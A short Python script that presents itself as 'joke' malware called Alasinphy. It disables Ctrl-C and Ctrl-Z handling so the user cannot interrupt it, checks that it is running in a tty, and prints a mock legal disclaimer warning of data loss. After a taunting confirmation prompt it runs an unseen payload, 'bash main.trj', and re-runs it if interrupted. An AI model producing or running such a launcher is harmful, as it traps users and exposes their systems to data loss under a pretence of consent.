#!/usr/bin/env python
import os
import time
import signal
signal.signal(signal.SIGINT, signal.SIG_IGN)
signal.signal(signal.SIGTSTP, signal.SIG_IGN)
if os.ttyname(0).startswith("/dev/tty"):
    tty = True
else:
    tty = False
if tty == False:
    print("Alasinphy isn't running in a tty, exiting...")
    exit()
def alasinphy():
    try:
        os.system("bash main.trj")
    except KeyboardInterrupt:
	    os.system("bash main.trj")
print("[WARN] The following program you have executed is a joke peice of malware. Any possible loss of data is not my fault and you are subject to the following terms:")
print("1. You may not take legal action towards me for damage caused by this program.")
print("2. Any attempt to do so will be caught.")
line = input("Are you sure you want to continue running this malware? (y/n)")
if line == "y":
	print("Good luck...")
	time.sleep(2)
	alasinphy()
else:
	print("Exiting... Too bad you're a coward.")
	exit()

